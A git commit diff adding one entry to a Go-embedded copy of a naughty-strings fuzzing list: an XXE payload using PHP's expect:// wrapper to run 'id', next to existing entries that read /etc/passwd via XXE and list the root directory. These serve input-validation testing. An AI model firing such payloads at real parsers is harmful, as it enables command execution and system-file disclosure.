47c5723a508d0901578a3f6614c399f0765dc4b6
Inf0Junki3 <Inf0Junki3>
2016-11-18 10:05:32 +0100

    Added XXE for PHP expect module

--- naughtystrings/internal/resource.go
+++ naughtystrings/internal/resource.go
@@ -956,6 +956,7 @@ var _BlnsJson = []byte(`[
   "Kernel.exit(1)", 
   "%x('ls -al /')", 
   "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>", 
+  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://id\" >]><foo>&xxe;</foo>", 
   "$HOME", 
   "$ENV{'HOME'}", 
   "%d", 
